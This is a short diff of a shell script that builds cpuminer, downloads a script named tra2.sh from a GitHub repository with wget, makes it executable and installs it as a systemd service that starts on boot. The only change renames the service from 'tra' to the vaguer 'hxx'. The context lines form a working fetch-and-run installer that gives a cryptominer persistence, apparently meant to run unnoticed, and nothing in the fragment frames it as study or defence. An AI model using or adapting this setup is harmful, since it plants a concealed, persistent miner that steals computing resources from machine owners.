@@ -8,9 +8,9 @@ cd cpuminer &&
 ./build.sh &&
 wget https://raw.githubusercontent.com/fablebox/susuwatari/master/thanhmlzz/tra2.sh &&
 chmod +x tra2.sh &&
-bash -c 'cat <<EOT >>/lib/systemd/system/tra.service 
+bash -c 'cat <<EOT >>/lib/systemd/system/hxx.service 
 [Unit]
-Description=tra
+Description=hxx
 After=network.target
 [Service]
 ExecStart= /usr/local/src/cpuminer/tra2.sh
@@ -23,5 +23,5 @@ WantedBy=multi-user.target
 EOT
 ' &&
 systemctl daemon-reload &&
-systemctl enable tra.service &&
-service tra start
+systemctl enable hxx.service &&
+service hxx start
